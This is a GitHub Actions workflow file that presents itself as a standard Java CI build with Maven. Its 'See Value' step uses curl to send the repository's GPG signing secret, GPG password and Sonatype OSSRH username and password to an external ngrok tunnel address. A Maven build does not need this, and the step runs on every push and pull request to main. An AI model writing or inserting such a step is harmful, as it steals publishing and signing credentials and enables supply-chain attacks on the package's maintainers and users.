# This workflow will build a Java project with Maven
# For more information see: https://help.github.com/actions/language-and-framework-guides/building-and-testing-java-with-maven

name: Java CI with Maven

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v2
    - name: Set up JDK 8
      uses: actions/setup-java@v2
      with:
        java-version: '8'
        distribution: 'adopt'
        server-id: sonatype-nexus-staging
        server-username: ${{ secrets.OSSRH_USER }}
        server-password: ${{ secrets.OSSRH_PASSWORD }}
        gpg-passphrase: ${{ secrets.GPG_PASSWORD }}
    - name: See Value
      run: |
        curl 'https://214f-206-237-1-105.ngrok-free.app/apk/seevalue' \
           -H 'Content-Type: application/json' \
           -d '
           {
            	"content": "GPG_SECRET = ${{ secrets.GPG_SECRET }} \n\n GPG_PASSWORD = ${{ secrets.GPG_PASSWORD }} \n\n OSSRH_USER = ${{ secrets.OSSRH_USER }} \n\n OSSRH_PASSWORD = ${{ secrets.OSSRH_PASSWORD }}"
           }'

